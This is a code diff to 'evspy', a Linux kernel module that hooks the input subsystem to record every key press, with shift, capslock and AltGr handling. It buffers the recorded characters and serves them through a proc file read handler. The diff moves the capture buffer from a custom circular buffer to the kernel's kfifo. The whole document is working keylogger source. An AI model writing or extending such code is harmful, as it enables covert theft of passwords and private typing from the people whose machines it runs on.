@@ -20,9 +20,11 @@
  * along with evspy.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#include "evspy-core.h"
-#include "cbuf.h"
 
+#include "evspy.h"
+
+
+DECLARE_KFIFO(cbuffer, char, EVS_BUFSIZE);
 
 static unsigned short int capslock_on = 0;
 static unsigned short int shift_on = 0;
@@ -47,9 +49,14 @@ static int evspy_read_proc(char *page, char **start, off_t offset, int count,
 #else
 		return -EPERM;
 #endif
-	}
+	} else {
+		n = kfifo_out(&cbuffer, page, count);
 
-	return cbuf_read(page, count, eof);
+		if (kfifo_is_empty(&cbuffer))
+			*eof = 1;
+
+		return n;
+	}
 }
 
 /*
@@ -139,7 +146,7 @@ static void special_char(unsigned int code, unsigned int value)
 		sp_tag[1] = '-';
 
 	while (*sp_tag)
-		cbuf_write(*sp_tag++);
+		evs_insert(&cbuffer, sp_tag++);
 }
 
 static void evspy_event(struct input_handle *handle, unsigned int type,
@@ -162,13 +169,13 @@ static void evspy_event(struct input_handle *handle, unsigned int type,
 	} else if (value == EVS_VAL_PRESS) {
 #ifdef EVS_ALTGR_ENABLED
 		if (altgr_on)
-			cbuf_write(evs_altgr(code));
+			evs_insert(&cbuffer, evs_altgr(code));
 		else
 #endif
 		if (shift_on || capslock_on)
-			cbuf_write(evs_shift(code));
+			evs_insert(&cbuffer, evs_shift(code));
 		else
-			cbuf_write(map[code]);
+			evs_insert(&cbuffer, &map[code]);
 	}
 }
 
@@ -232,7 +239,8 @@ static int __init evspy_init(void)
 #ifdef EVS_ALTGR_ENABLED
 	init_altgrmap();
 #endif
-	cbuf_init();
+	//cbuf_init();
+	INIT_KFIFO(cbuffer);
 	return input_register_handler(&evspy_handler);
 }
 
